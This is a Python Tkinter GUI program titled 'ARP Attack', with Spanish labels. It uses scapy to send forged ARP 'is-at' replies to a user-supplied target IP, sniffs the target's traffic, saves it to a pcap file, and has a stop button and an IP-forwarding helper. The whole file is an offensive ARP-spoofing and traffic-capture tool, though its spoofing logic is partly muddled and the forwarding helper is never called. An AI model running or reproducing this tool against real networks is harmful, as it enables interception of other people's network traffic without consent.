import tkinter as tk
import tkinter.font as tkFont
from tkinter import ttk
from tkinter import messagebox as tkMessageBox
from scapy.all import *
import socket
from python.service import WService
from scapy.all import Ether, ARP, srp, send, sniff
import sys
import threading
import requests


class App:
    def __init__(self, root):
        #setting title
        root.title("ARP Attack")
        #setting window size
        width=600
        height=700
        screenwidth = root.winfo_screenwidth()
        screenheight = root.winfo_screenheight()
        alignstr = '%dx%d+%d+%d' % (width, height, (screenwidth - width) / 2, (screenheight - height) / 2)
        root.geometry(alignstr)
        root.resizable(width=True, height=True)
        canvas = tk.Canvas(root)
        scrollbar = ttk.Scrollbar(root, orient="vertical", command=canvas.yview)
        scrollable_frame = ttk.Frame(canvas)
        scrollable_frame.bind(
            "<Configure>",
            lambda e: canvas.configure(
                scrollregion=canvas.bbox("all")
            )
        )
        canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")

        canvas.configure(yscrollcommand=scrollbar.set,bg="black")
        canvas.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")
        
        GLabel_950=tk.Label(root)
        ft = tkFont.Font(family='Times New Roman',size=20)
        GLabel_950["font"] = ft
        GLabel_950["fg"] = "white"
        GLabel_950["bg"] = "black"
        GLabel_950["justify"] = "center"
        GLabel_950["text"] = "ARP Attack"
        GLabel_950.place(x=70,y=20,width=411,height=35)

        self.targetip = tk.StringVar()
        GLineEdit_132=tk.Entry(root)
        GLineEdit_132["borderwidth"] = "1px"
        ft = tkFont.Font(family='Times',size=10)
        GLineEdit_132["font"] = ft
        GLineEdit_132["fg"] = "black"
        GLineEdit_132["bg"] = "white"
        GLineEdit_132["justify"] = "center"
        GLineEdit_132["textvariable"] = self.targetip
        GLineEdit_132.place(x=330,y=80,width=128,height=30)

        GLabel_981=tk.Label(root)
        ft = tkFont.Font(family='Times',size=10)
        GLabel_981["font"] = ft
        GLabel_981["fg"] = "white"
        GLabel_981["bg"] = "black"
        GLabel_981["justify"] = "center"
        GLabel_981["text"] = "Introduzca la direccion IP:"
        GLabel_981.place(x=10,y=80,width=210,height=33)

        hostname=socket.gethostname()
        self.ip_host=socket.gethostbyname(hostname)
        self.verbose = True

        archivoL=tk.Label(root)
        ft = tkFont.Font(family='Times',size=10)
        archivoL["font"] = ft
        archivoL["fg"] = "white"
        archivoL["bg"] = "black"
        archivoL["justify"] = "center"
        archivoL["text"] = "Introduzca el nombre del archivo del output:"
        archivoL.place(x=10,y=150,width=310,height=33)
        
        self.output=tk.StringVar()
        GLineEdit_335=tk.Entry(root)
        GLineEdit_335["borderwidth"] = "1px"
        ft = tkFont.Font(family='Times',size=10)
        GLineEdit_335["font"] = ft
        GLineEdit_335["fg"] = "black"
        GLineEdit_335["bg"] = "white"
        GLineEdit_335["justify"] = "center"
        GLineEdit_335["textvariable"] = self.output
        GLineEdit_335.place(x=356,y=150,width=125,height=30)
                
        GButton_797=tk.Button(root)
        GButton_797["bg"] = "white"
        ft = tkFont.Font(family='Times',size=10)
        GButton_797["font"] = ft
        GButton_797["fg"] = "#000000"
        GButton_797["justify"] = "center"
        GButton_797["text"] = "Empezar"
        GButton_797.place(x=120,y=240,width=122,height=30)
        GButton_797["command"] = self.GButton_797_command

        GButton_798=tk.Button(root)
        GButton_798["bg"] = "white"
        ft = tkFont.Font(family='Times',size=10)
        GButton_798["font"] = ft
        GButton_798["fg"] = "#000000"
        GButton_798["justify"] = "center"
        GButton_798["text"] = "Parar"
        GButton_798.place(x=250,y=240,width=122,height=30)
        GButton_798["command"] = self.GButton_798_command
        self.cont=280

    def GButton_797_command(self):
        target=self.targetip.get()
        output = self.output.get()
        verbose = self.verbose
        
        mac_victima=self.get_mac(target)
        respuesta_arp=ARP(pdst=target,hwdst=mac_victima,psrc=self.ip_host,op='is-at')
        send(respuesta_arp,verbose=0)
        if verbose:
            mac_host = ARP().hwsrc
            print("[+] Enviado a {} : {} is-at {}".format(target, self.ip_host, mac_host))
            label = tk.Label(root,text="[+] Enviado a {} : {} is-at {}".format(target, self.ip_host, mac_host),fg="yellow",bg="black",justify="center")
            label.place(x=30,y=self.cont,width=530,height=20)
            self.cont=self.cont+20
            print("PAQUETES CAPTURADOS")
            capture = sniff(filter=f"ip src host {target} or ip src host {self.ip_host}",timeout=int(2))
            print(capture.summary())
            wrpcap("App/rastreo_output/{}.cap".format(output),capture)
            label = tk.Label(root,text=str(capture),fg="green",bg="black",justify="center")
            label.place(x=30,y=self.cont,width=530,height=20)
            self.cont=self.cont+20

    def GButton_798_command(self):
        target=self.targetip.get()
        verbose = self.verbose
        mac_victima=self.get_mac(target)
        mac_host=self.get_mac(self.ip_host)
        respuesta_arp=ARP(pdst=target,hwdst=mac_victima,psrc=self.ip_host,hwsrc=mac_host,op='is-at')
        send(respuesta_arp,verbose=0,count=7)
        if verbose:
            print("[+] Enviado a {} : {} is-at {}".format(target, self.ip_host, mac_host))
            label = tk.Label(root,text="[+] Enviado a {} : {} is-at {}".format(target, self.ip_host, mac_host),fg="yellow",bg="black",justify="center")
            label.place(x=30,y=self.cont,width=530,height=20)
            self.cont=self.cont+20
    def get_mac(self,ip):
        ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
        if ans:
            return ans[0][1].src
    def habilitar_ruta(self,verbose=True):
        if verbose:
            print("Habilitando la ruta ip")
            label = tk.Label(root,text="Habilitando la ruta IP",fg="yellow",bg="black",justify="center")
            label.place(x=30,y=self.cont,width=530,height=20)
            self.cont=self.cont+20
            if "nt" in os.name:
                service = WService("RemoteAccess")
                service.start()
            else:
                archivo_ip="/proc/sys/net/ipv4/ip_forward"
                with open(archivo_ip) as fichero:
                    if not fichero.read() == 1:
                        with open(archivo_ip, "w") as fichero:
                            print(1, file=fichero)
        if verbose:
            print("La ruta ip se ha habilitado")
            label = tk.Label(root,text="La ruta IP se ha habilitado",fg="gren",bg="black",justify="center")
            label.place(x=30,y=self.cont,width=530,height=20)
            self.cont=self.cont+20
        
        
        

if __name__ == "__main__":
    root = tk.Tk()
    app = App(root)
    root.mainloop()